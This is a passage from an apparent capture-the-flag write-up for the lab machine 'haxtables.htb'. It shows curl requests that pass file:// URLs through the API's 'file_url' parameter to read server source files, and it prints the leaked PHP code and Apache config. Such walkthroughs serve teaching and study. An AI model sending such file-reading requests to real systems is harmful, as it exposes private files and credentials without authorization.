</span></span><span class=line><span class=cl>        &lt;Directory /var/www/image&gt;
</span></span><span class=line><span class=cl>                Deny from all
</span></span><span class=line><span class=cl>                Allow from 127.0.0.1
</span></span><span class=line><span class=cl>                Options Indexes FollowSymLinks
</span></span><span class=line><span class=cl>                AllowOverride All
</span></span><span class=line><span class=cl>                Require all granted
</span></span><span class=line><span class=cl>        &lt;/DIrectory&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
</span></span></code></pre></td></tr></table></div></div><p>With the <code>DocumentRoot /var/www/html</code>, we can retrieve <code>index.php</code> &ndash; which doesn&rsquo;t contain much interesting. We also have <code>DocumentRoot /var/www/api</code> , which is the location of the API we exploited via LFI. Let&rsquo;s look at the strings PHP script we exploited:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/api/v3/tools/string/index.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>1995</span>    <span class=m>0</span>  <span class=m>1911</span>  <span class=m>100</span>    <span class=m>84</span>  <span class=m>43627</span>   <span class=m>1917</span> --:--:-- --:--:-- --:--:-- <span class=m>46395</span>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include_once <span class=s1>&#39;../../../utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>include_once <span class=s1>&#39;utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>isset<span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s1>&#39;data_file&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$action</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> file_get_contents<span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s1>&#39;data_file&#39;</span><span class=o>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$jsondata</span> <span class=o>=</span> json_decode<span class=o>(</span>file_get_contents<span class=o>(</span><span class=s1>&#39;php://input&#39;</span><span class=o>)</span>, <span class=nb>true</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$action</span> <span class=o>=</span> <span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span> empty<span class=o>(</span><span class=nv>$jsondata</span><span class=o>)</span> <span class=o>||</span> !array_key_exists<span class=o>(</span><span class=s1>&#39;action&#39;</span>, <span class=nv>$jsondata</span><span class=o>))</span> 
</span></span><span class=line><span class=cl>    <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;message&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;Insufficient parameters!&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span>array_key_exists<span class=o>(</span><span class=s1>&#39;file_url&#39;</span>, <span class=nv>$jsondata</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> get_url_content<span class=o>(</span><span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;file_url&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;data&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=nv>$action</span>  <span class=o>===</span> <span class=s1>&#39;str2hex&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; str2hex<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span>  <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;hex2str&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span> <span class=o>=</span>&gt; hex2str<span class=o>(</span><span class=nv>$data</span><span class=o>)</span> <span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;md5&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; md5<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;sha1&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; sha1<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;urlencode&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; urlencode<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;urldecode&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; urldecode<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;b64encode&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; base64_encode<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=nv>$action</span> <span class=o>===</span> <span class=s1>&#39;b64decode&#39;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;data&#39;</span><span class=o>=</span>&gt; base64_decode<span class=o>(</span><span class=nv>$data</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;message&#39;</span><span class=o>=</span>&gt; <span class=s1>&#39;Invalid action&#39;</span><span class=o>]</span>, 404<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;%                             
</span></span></code></pre></td></tr></table></div></div><p>This includes <code>../../../utils.php</code>, which contains the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/api/utils.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d 
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>2543</span>    <span class=m>0</span>  <span class=m>2475</span>  <span class=m>100</span>    <span class=m>68</span>  <span class=m>55661</span>   <span class=m>1529</span> --:--:-- --:--:-- --:--:-- <span class=m>57795</span>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Global functions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> jsonify<span class=o>(</span><span class=nv>$body</span>, <span class=nv>$code</span> <span class=o>=</span> null<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=nv>$code</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        http_response_code<span class=o>(</span><span class=nv>$code</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    header<span class=o>(</span><span class=s1>&#39;Content-Type: application/json; charset=utf-8&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> json_encode<span class=o>(</span><span class=nv>$body</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    exit<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> get_included_contents<span class=o>(</span><span class=nv>$filename</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    ob_start<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    include <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> ob_get_clean<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> get_url_content<span class=o>(</span><span class=nv>$url</span><span class=o>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$domain</span> <span class=o>=</span> parse_url<span class=o>(</span><span class=nv>$url</span>, PHP_URL_HOST<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span>gethostbyname<span class=o>(</span><span class=nv>$domain</span><span class=o>)</span> <span class=o>===</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    jsonify<span class=o>([</span><span class=s2>&#34;message&#34;</span> <span class=o>=</span>&gt; <span class=s2>&#34;Unacceptable URL&#34;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$ch</span> <span class=o>=</span> curl_init<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_URL, <span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>,CURLOPT_CONNECTTIMEOUT,2<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt <span class=o>(</span><span class=nv>$ch</span>, CURLOPT_FOLLOWLOCATION, 0<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>,CURLOPT_RETURNTRANSFER,1<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$url_content</span> <span class=o>=</span>  curl_exec<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_close<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$url_content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> make_api_call<span class=o>(</span><span class=nv>$action</span>, <span class=nv>$data</span>, <span class=nv>$uri_path</span>, <span class=nv>$is_file</span> <span class=o>=</span> <span class=nb>false</span><span class=o>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=nv>$is_file</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$post</span> <span class=o>=</span> <span class=o>[</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;data&#39;</span> <span class=o>=</span>&gt; file_get_contents<span class=o>(</span><span class=nv>$data</span><span class=o>)</span>,
</span></span><span class=line><span class=cl>            <span class=s1>&#39;action&#39;</span> <span class=o>=</span>&gt; <span class=nv>$action</span>,
</span></span><span class=line><span class=cl>            <span class=s1>&#39;uri_path&#39;</span> <span class=o>=</span>&gt; <span class=nv>$uri_path</span>
</span></span><span class=line><span class=cl>        <span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$post</span> <span class=o>=</span> <span class=o>[</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;data&#39;</span> <span class=o>=</span>&gt; <span class=nv>$data</span>,
</span></span><span class=line><span class=cl>            <span class=s1>&#39;action&#39;</span> <span class=o>=</span>&gt; <span class=nv>$action</span>,
</span></span><span class=line><span class=cl>            <span class=s1>&#39;uri_path&#39;</span> <span class=o>=</span>&gt; <span class=nv>$uri_path</span>
</span></span><span class=line><span class=cl>        <span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$ch</span> <span class=o>=</span> curl_init<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$url</span> <span class=o>=</span> <span class=s1>&#39;http://api.haxtables.htb&#39;</span> . <span class=nv>$uri_path</span> . <span class=s1>&#39;/index.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_URL, <span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>,CURLOPT_CONNECTTIMEOUT,2<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt <span class=o>(</span><span class=nv>$ch</span>, CURLOPT_FOLLOWLOCATION, 0<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_RETURNTRANSFER, <span class=nb>true</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_POSTFIELDS, json_encode<span class=o>(</span><span class=nv>$post</span><span class=o>))</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span> <span class=nv>$ch</span>, CURLOPT_HTTPHEADER, array<span class=o>(</span><span class=s1>&#39;Content-Type:application/json&#39;</span><span class=o>))</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$response</span> <span class=o>=</span> curl_exec<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_close<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s the source of <code>/handler.php</code>, which is the wrapper used by the web interface to call the underlying API:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/html/handler.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>1155</span>    <span class=m>0</span>  <span class=m>1084</span>  <span class=m>100</span>    <span class=m>71</span>  <span class=m>24394</span>   <span class=m>1597</span> --:--:-- --:--:-- --:--:-- <span class=m>26250</span>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include_once <span class=s1>&#39;../api/utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>isset<span class=o>(</span><span class=nv>$_FILES</span><span class=o>[</span><span class=s1>&#39;data_file&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$is_file</span> <span class=o>=</span> true<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$action</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$uri_path</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;uri_path&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=o>[</span><span class=s1>&#39;data_file&#39;</span><span class=o>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$is_file</span> <span class=o>=</span> false<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$jsondata</span> <span class=o>=</span> json_decode<span class=o>(</span>file_get_contents<span class=o>(</span><span class=s1>&#39;php://input&#39;</span><span class=o>)</span>, <span class=nb>true</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$action</span> <span class=o>=</span> <span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;data&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$uri_path</span> <span class=o>=</span> <span class=nv>$jsondata</span><span class=o>[</span><span class=s1>&#39;uri_path&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span> empty<span class=o>(</span><span class=nv>$jsondata</span><span class=o>)</span> <span class=o>||</span> !array_key_exists<span class=o>(</span><span class=s1>&#39;action&#39;</span>, <span class=nv>$jsondata</span><span class=o>)</span> <span class=o>||</span> !array_key_exists<span class=o>(</span><span class=s1>&#39;uri_path&#39;</span>, <span class=nv>$jsondata</span><span class=o>))</span> 
</span></span><span class=line><span class=cl>    <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;message&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;Insufficient parameters!&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        // <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;message&#39;</span> <span class=o>=</span>&gt; file_get_contents<span class=o>(</span><span class=s1>&#39;php://input&#39;</span><span class=o>)])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$response</span> <span class=o>=</span> make_api_call<span class=o>(</span><span class=nv>$action</span>, <span class=nv>$data</span>, <span class=nv>$uri_path</span>, <span class=nv>$is_file</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>I noticed the images convert page just says <em>Coming soon!</em>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-05-20-29-11-image.png data-srcset="./assets/2023-04-05-20-29-11-image.png, ./assets/2023-04-05-20-29-11-image.png 1.5x, ./assets/2023-04-05-20-29-11-image.png 2x" data-sizes=auto alt=./assets/2023-04-05-20-29-11-image.png title=./assets/2023-04-05-20-29-11-image.png></p><p>But this is clearly defined in the Apache config:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>        &lt;Directory /var/www/image&gt;
</span></span><span class=line><span class=cl>                Deny from all
</span></span><span class=line><span class=cl>                Allow from 127.0.0.1
</span></span><span class=line><span class=cl>                Options Indexes FollowSymLinks
</span></span><span class=line><span class=cl>                AllowOverride All
</span></span><span class=line><span class=cl>                Require all granted
</span></span><span class=line><span class=cl>        &lt;/Directory&gt;
</span></span></code></pre></td></tr></table></div></div><p>So looking at <code>/var/www/images/index.php</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
